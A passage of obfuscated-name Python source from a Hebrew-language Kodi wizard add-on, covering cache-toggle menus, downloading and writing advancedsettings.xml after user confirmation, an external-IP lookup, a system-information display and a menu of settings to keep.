	addFile ('Include Video Cache in Clear Cache: %s'%OO0O00OOO0OOOOOOO .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2905
	if OO0O00OOO0OOOOOOO =='true':#line:2906
		addFile ('--- Include All Video Addons: %s'%OOO00OOOOO00OO000 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Include Bob: %s'%O00OOOOO00O0OO00O .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2908
		addFile ('--- Include Phoenix: %s'%O0O0000O0OO000OOO .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2909
		addFile ('--- Include Specto: %s'%OO0O00O0O00O0O0OO .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2910
		addFile ('--- Include Exodus: %s'%OO0O0000O0000O0OO .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2911
		addFile ('--- Include Salts: %s'%OO0OO000000000O00 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2912
		addFile ('--- Include Salts HD Lite: %s'%O0O0OOOOOOOO00000 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2913
		addFile ('--- Include One Channel: %s'%O0OOOOO0OOO0OO000 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2914
		addFile ('--- Include Genesis: %s'%O00OOOOO000000O00 .replace ('true',O0O0OOOO0O0OO0O00 ).replace ('false',O000OO000OO000O0O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2915
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2916
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2917
	setView ('files','viewType')#line:2918
def advancedWindow (url =None ):#line:2920
	if not ADVANCEDFILE =='http://':#line:2921
		if url ==None :#line:2922
			O0OOOO00OO0O00O0O =wiz .workingURL (ADVANCEDFILE )#line:2923
			O00OO0OOOO0OOOOO0 =uservar .ADVANCEDFILE #line:2924
		else :#line:2925
			O0OOOO00OO0O00O0O =wiz .workingURL (url )#line:2926
			O00OO0OOOO0OOOOO0 =url #line:2927
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2928
		if os .path .exists (ADVANCED ):#line:2929
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2930
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2931
		if O0OOOO00OO0O00O0O ==True :#line:2932
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2933
			OOOOOOO00000OOO0O =wiz .openURL (O00OO0OOOO0OOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2934
			OOO0O000O0OOO00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOOOOO00000OOO0O )#line:2935
			if len (OOO0O000O0OOO00OO )>0 :#line:2936
				for O000O0000OO0O0OOO ,OOO0O0O0O0OO0O0OO ,url ,OO0OO00OO00O00OO0 ,O0OOOOOOO000OOOO0 ,O0OO0OO0OO00OO00O in OOO0O000O0OOO00OO :#line:2937
					if OOO0O0O0O0OO0O0OO .lower ()=="yes":#line:2938
						addDir ("[B]%s[/B]"%O000O0000OO0O0OOO ,'advancedsetting',url ,description =O0OO0OO0OO00OO00O ,icon =OO0OO00OO00O00OO0 ,fanart =O0OOOOOOO000OOOO0 ,themeit =THEME3 )#line:2939
					else :#line:2940
						addFile (O000O0000OO0O0OOO ,'writeadvanced',O000O0000OO0O0OOO ,url ,description =O0OO0OO0OO00OO00O ,icon =OO0OO00OO00O00OO0 ,fanart =O0OOOOOOO000OOOO0 ,themeit =THEME2 )#line:2941
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2942
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOOO00OO0O00O0O )#line:2943
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2944
def writeAdvanced (O00OOO0OOOOO00O0O ,O0OO0OOOOOOOO000O ):#line:2946
	OO00O0000OO0OOO0O =wiz .workingURL (O0OO0OOOOOOOO000O )#line:2947
	if OO00O0000OO0OOO0O ==True :#line:2948
		if os .path .exists (ADVANCED ):O00OO00000OOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OOO0OOOOO00O0O ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2949
		else :O00OO00000OOOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O00OOO0OOOOO00O0O ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2950
		if O00OO00000OOOOOOO ==1 :#line:2952
			OO0000O00OOO0OO00 =wiz .openURL (O0OO0OOOOOOOO000O )#line:2953
			O0O0OOOOOO0OOOOO0 =open (ADVANCED ,'w');#line:2954
			O0O0OOOOOO0OOOOO0 .write (OO0000O00OOO0OO00 )#line:2955
			O0O0OOOOOO0OOOOO0 .close ()#line:2956
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2957
			wiz .killxbmc (True )#line:2958
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2959
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O0000OO0OOO0O );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2960
def viewAdvanced ():#line:2962
	OOO0O000O0OOOOO00 =open (ADVANCED )#line:2963
	O000OOO00OO00OOOO =OOO0O000O0OOOOO00 .read ().replace ('\t','    ')#line:2964
	wiz .TextBox (ADDONTITLE ,O000OOO00OO00OOOO )#line:2965
	OOO0O000O0OOOOO00 .close ()#line:2966
def removeAdvanced ():#line:2968
	if os .path .exists (ADVANCED ):#line:2969
		wiz .removeFile (ADVANCED )#line:2970
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2971
def showAutoAdvanced ():#line:2973
	notify .autoConfig ()#line:2974
def getIP ():#line:2976
	OO00O000OO0000OOO ='http://whatismyipaddress.com/'#line:2977
	if not wiz .workingURL (OO00O000OO0000OOO ):return 'Unknown','Unknown','Unknown'#line:2978
	O0OO0OO0O0OO00OOO =wiz .openURL (OO00O000OO0000OOO ).replace ('\n','').replace ('\r','')#line:2979
	if not 'Access Denied'in O0OO0OO0O0OO00OOO :#line:2980
		OOOOO0OO00OOOO000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0OO0OO0O0OO00OOO )#line:2981
		OOO00000O0O00OOO0 =OOOOO0OO00OOOO000 [0 ]if (len (OOOOO0OO00OOOO000 )>0 )else 'Unknown'#line:2982
		OOOO00O0OO0OO00O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0OO0OO0O0OO00OOO )#line:2983
		OOO00OOO00O0O000O =OOOO00O0OO0OO00O0 [0 ]if (len (OOOO00O0OO0OO00O0 )>0 )else 'Unknown'#line:2984
		O00O000OO000OO0O0 =OOOO00O0OO0OO00O0 [1 ]+', '+OOOO00O0OO0OO00O0 [2 ]+', '+OOOO00O0OO0OO00O0 [3 ]if (len (OOOO00O0OO0OO00O0 )>2 )else 'Unknown'#line:2985
		return OOO00000O0O00OOO0 ,OOO00OOO00O0O000O ,O00O000OO000OO0O0 #line:2986
	else :return 'Unknown','Unknown','Unknown'#line:2987
def systemInfo ():#line:2989
	O000O00OO0OO00OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3003
	O000O00OOOOOOO0O0 =[];OOO000000O00O00O0 =0 #line:3004
	for O0O0OOO0OOOO000O0 in O000O00OO0OO00OO0 :#line:3005
		OOOO0000O0OOOOOO0 =wiz .getInfo (O0O0OOO0OOOO000O0 )#line:3006
		O0OO000OO000000OO =0 #line:3007
		while OOOO0000O0OOOOOO0 =="Busy"and O0OO000OO000000OO <10 :#line:3008
			OOOO0000O0OOOOOO0 =wiz .getInfo (O0O0OOO0OOOO000O0 );O0OO000OO000000OO +=1 ;wiz .log ("%s sleep %s"%(O0O0OOO0OOOO000O0 ,str (O0OO000OO000000OO )));xbmc .sleep (1000 )#line:3009
		O000O00OOOOOOO0O0 .append (OOOO0000O0OOOOOO0 )#line:3010
		OOO000000O00O00O0 +=1 #line:3011
	O0O0O0000OO00O0OO =O000O00OOOOOOO0O0 [8 ]if 'Una'in O000O00OOOOOOO0O0 [8 ]else wiz .convertSize (int (float (O000O00OOOOOOO0O0 [8 ][:-8 ]))*1024 *1024 )#line:3012
	OOOOOOOOOOOO0OO00 =O000O00OOOOOOO0O0 [9 ]if 'Una'in O000O00OOOOOOO0O0 [9 ]else wiz .convertSize (int (float (O000O00OOOOOOO0O0 [9 ][:-8 ]))*1024 *1024 )#line:3013
	OOOOOOOOO00000OO0 =O000O00OOOOOOO0O0 [10 ]if 'Una'in O000O00OOOOOOO0O0 [10 ]else wiz .convertSize (int (float (O000O00OOOOOOO0O0 [10 ][:-8 ]))*1024 *1024 )#line:3014
	OO0O0OO0O00O000O0 =wiz .convertSize (int (float (O000O00OOOOOOO0O0 [11 ][:-2 ]))*1024 *1024 )#line:3015
	O0O00OO00O0O000OO =wiz .convertSize (int (float (O000O00OOOOOOO0O0 [12 ][:-2 ]))*1024 *1024 )#line:3016
	OOO000000000OO00O =wiz .convertSize (int (float (O000O00OOOOOOO0O0 [13 ][:-2 ]))*1024 *1024 )#line:3017
	OO000O0OOOOO000OO ,O0OO00OOO0OOO00O0 ,OO0O000OO0O000000 =getIP ()#line:3018
	OO0OO00OO0O0O0OO0 =[];O000000OO0O000000 =[];O0OO0OO00OO00O0O0 =[];O00O0O0O0OOO00000 =[];O00OOO0OOO0O00OO0 =[];OOO00OO00O00O0O0O =[];O00O0O000000OOO00 =[]#line:3020
	O0OO00O000O000O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3022
	for OO000OO00000O0O00 in sorted (O0OO00O000O000O0O ,key =lambda O00OOO00000O0OO00 :O00OOO00000O0OO00 ):#line:3023
		O0O0O00OO00O0OO0O =os .path .split (OO000OO00000O0O00 [:-1 ])[1 ]#line:3024
		if O0O0O00OO00O0OO0O =='packages':continue #line:3025
		OO0O000O0000OO000 =os .path .join (OO000OO00000O0O00 ,'addon.xml')#line:3026
		if os .path .exists (OO0O000O0000OO000 ):#line:3027
			O00O0O0O00OOOOO0O =open (OO0O000O0000OO000 )#line:3028
			OOOO0000O0O0OO0O0 =O00O0O0O00OOOOO0O .read ()#line:3029
			O00OOOO0O00O000O0 =re .compile ("<provides>(.+?)</provides>").findall (OOOO0000O0O0OO0O0 )#line:3030
			if len (O00OOOO0O00O000O0 )==0 :#line:3031
				if O0O0O00OO00O0OO0O .startswith ('skin'):O00O0O000000OOO00 .append (O0O0O00OO00O0OO0O )#line:3032
				if O0O0O00OO00O0OO0O .startswith ('repo'):O00OOO0OOO0O00OO0 .append (O0O0O00OO00O0OO0O )#line:3033
				else :OOO00OO00O00O0O0O .append (O0O0O00OO00O0OO0O )#line:3034
			elif not (O00OOOO0O00O000O0 [0 ]).find ('executable')==-1 :O00O0O0O0OOO00000 .append (O0O0O00OO00O0OO0O )#line:3035
			elif not (O00OOOO0O00O000O0 [0 ]).find ('video')==-1 :O0OO0OO00OO00O0O0 .append (O0O0O00OO00O0OO0O )#line:3036
			elif not (O00OOOO0O00O000O0 [0 ]).find ('audio')==-1 :O000000OO0O000000 .append (O0O0O00OO00O0OO0O )#line:3037
			elif not (O00OOOO0O00O000O0 [0 ]).find ('image')==-1 :OO0OO00OO0O0O0OO0 .append (O0O0O00OO00O0OO0O )#line:3038
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3041
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3042
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3043
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3044
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3045
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3051
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0000OO00O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOOOOO0OO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOOOOOOO00000OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO0O00O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OO00O0O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3058
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO000000000OO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3059
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000O0OOOOO000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO00OOO0OOO00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O000OO0O000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OOOOOOO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	OOO00OOO0O00O00O0 =len (OO0OO00OO0O0O0OO0 )+len (O000000OO0O000000 )+len (O0OO0OO00OO00O0O0 )+len (O00O0O0O0OOO00000 )+len (OOO00OO00O00O0O0O )+len (O00O0O000000OOO00 )+len (O00OOO0OOO0O00OO0 )#line:3068
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOO00OOO0O00O00O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3069
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OO0OO00OO00O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3070
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0O0O0OOO00000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3071
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O000000OO0O000000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3072
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0OO00OO0O0O0OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3073
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00OOO0OOO0O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3074
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O00O0O000000OOO00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3075
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OO00O00O0O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3076
def Menu ():#line:3077
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3078
def saveMenu ():#line:3080
	O0OOO0OO00OO00OO0 ='[COLOR yellow]מופעל[/COLOR]';O00O0O00OOO0OOOOO ='[COLOR blue]מבוטל[/COLOR]'#line:3082
	O00OO0O0OO0OOOOO0 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3083
	OOO0O0OO0OOOO00OO ='true'if KEEPMOVIELIST =='true'else 'false'#line:3084
	OO0O00000OOOOO0OO ='true'if KEEPINFO =='true'else 'false'#line:3085
	O0OOO0O0O0O0OOOOO ='true'if KEEPSOUND =='true'else 'false'#line:3087
	OO00O0OOOOOOOOOO0 ='true'if KEEPVIEW =='true'else 'false'#line:3088
	O000OO0000000O000 ='true'if KEEPSKIN =='true'else 'false'#line:3089
	O00O00O0O0OO0O00O ='true'if KEEPSKIN2 =='true'else 'false'#line:3090
	O0O0O000OO0O0OOOO ='true'if KEEPSKIN3 =='true'else 'false'#line:3091
	O0O0O00000OOOOO0O ='true'if KEEPADDONS =='true'else 'false'#line:3092
	O00000O00OOOO0OOO ='true'if KEEPPVR =='true'else 'false'#line:3093
	O0OOOOOOOOO00O000 ='true'if KEEPTVLIST =='true'else 'false'#line:3094
	O000OOOO00O0000O0 ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3095
	O000O0O000O0O00O0 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3096
	O0OO0OOOOO00O00OO ='true'if KEEPHUBTV =='true'else 'false'#line:3097
	O0OOO0O0OO0O000OO ='true'if KEEPHUBVOD =='true'else 'false'#line:3098
	O00OOOOOO00OOO000 ='true'if KEEPHUBSPORT =='true'else 'false'#line:3099
	OO00OO0OO0000OO0O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3100
	O0OO0O0O0OOOOO0OO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3101
	O0OO0000O0O0OO00O ='true'if KEEPHUBMENU =='true'else 'false'#line:3102
	O0OOO0O000OOOO0O0 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3103
	OO00OO0OO00OO00OO ='true'if KEEPTRAKT =='true'else 'false'#line:3104
	O0000O0O0OOOO0OOO ='true'if KEEPREAL =='true'else 'false'#line:3105
	OOO0O00000O0OOOO0 ='true'if KEEPRD2 =='true'else 'false'#line:3106
	OO00OO000OOO0OOOO ='true'if KEEPTORNET =='true'else 'true'#line:3107
	O00O00OO0O0O0O0O0 ='true'if KEEPLOGIN =='true'else 'false'#line:3108
	OO0OOO000O00O0O0O ='true'if KEEPSOURCES =='true'else 'false'#line:3109
	OOOOO00OOO0O0000O ='true'if KEEPADVANCED =='true'else 'false'#line:3110
	OOO0O0O00O0OOO000 ='true'if KEEPPROFILES =='true'else 'false'#line:3111
	O00000OOOOO00000O ='true'if KEEPFAVS =='true'else 'false'#line:3112
	O000OOOOOO000O00O ='true'if KEEPREPOS =='true'else 'false'#line:3113
	OOO0000O0OOOOOO00 ='true'if KEEPSUPER =='true'else 'false'#line:3114
	O000OO0OOOO00O00O ='true'if KEEPWHITELIST =='true'else 'false'#line:3115
	OOOO00O00OOO0O0OO ='true'if KEEPWEATHER =='true'else 'false'#line:3116
	O0000O0O0O0O00000 ='true'if KEEPVICTORY =='true'else 'false'#line:3117
	OO00000000OOO0OOO ='true'if KEEPTELEMEDIA =='true'else 'false'#line:3118
	if O000OO0OOOO00O00O =='true':#line:3120
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3121
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3122
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3123
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3124
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת חשבון RD:  '%O0000O0O0OOOO0OOO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת חשבון טראקט:  '%OO00OO0OO00OO00OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת מועדפים:  '%O00000OOOOO00000O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת לקוח טלוויזיה:  '%O00000O00OOOO0OOO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות הרחבה ויקטורי:  '%O0000O0O0O0O00000 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepvictory',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת חשבון טלמדיה:  '%OO00000000OOO0OOO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keeptelemedia',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%O0OOOOOOOOO00O000 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3136
	addFile ('%s שמירת אריח סרטים:  '%O000OOOO00O0000O0 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3137
	addFile ('%s שמירת אריח סדרות:  '%O000O0O000O0O00O0 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת אריח טלויזיה:  '%O0OO0OOOOO00O00OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3139
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O0OOO0O0OO0O000OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3140
	addFile ('%s שמירת אריח ספורט:  '%O00OOOOOO00OOO000 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת אריח ילדים:  '%OO00OO0OO0000OO0O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת אריח מוסיקה:  '%O0OO0O0O0OOOOO0OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3143
	addFile ('%s שמירת תפריט אריחים ראשי:  '%O0OO0000O0O0OO00O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3144
	addFile ('%s שמירת כל האריחים בסקין:  '%O000OO0000000O000 .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OOOO00O00OOO0O0OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3146
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O0O0O00000OOOOO0O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3152
	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%OO0O00000OOOOO0OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3153
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO0O0OO0OOOO00OO .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3156
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%OO0OOO000O00O0O0O .replace ('true',O0OOO0OO00OO00OO0 ).replace ('false',O00O0O00OOO0OOOOO ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3157
